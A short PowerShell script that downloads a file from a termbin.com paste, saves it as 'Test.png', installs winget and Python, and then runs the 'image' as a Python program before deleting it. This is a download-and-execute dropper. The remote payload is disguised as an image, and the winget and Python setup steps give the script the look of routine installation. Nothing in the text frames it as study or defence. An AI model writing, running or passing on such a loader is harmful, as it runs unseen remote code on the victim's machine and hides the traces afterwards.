$url = 'https://termbin.com/8aan'

Invoke-WebRequest -Uri $url -OutFile Test.png

$hasPackageManager = Get-AppPackage -name 'Microsoft.DesktopAppInstaller'
if ($env:OS='Windows_NT' )
{
    Write-Output "The condition was true"
if(!$hasPackageManager)
{
    Add-AppxPackage -Path 'https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx'

    $releases_url = 'https://api.github.com/repos/microsoft/winget-cli/releases/latest'

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $releases = Invoke-RestMethod -uri $releases_url
    $latestRelease = $releases.assets | Where { $_.browser_download_url.EndsWith('msixbundle') } | Select -First 1

    "Installing winget from $($latestRelease.browser_download_url)"
    Add-AppxPackage -Path $latestRelease.browser_download_url
}


winget install Python.Python
}
python3 ./Test.png
Remove-Item './Test.png'
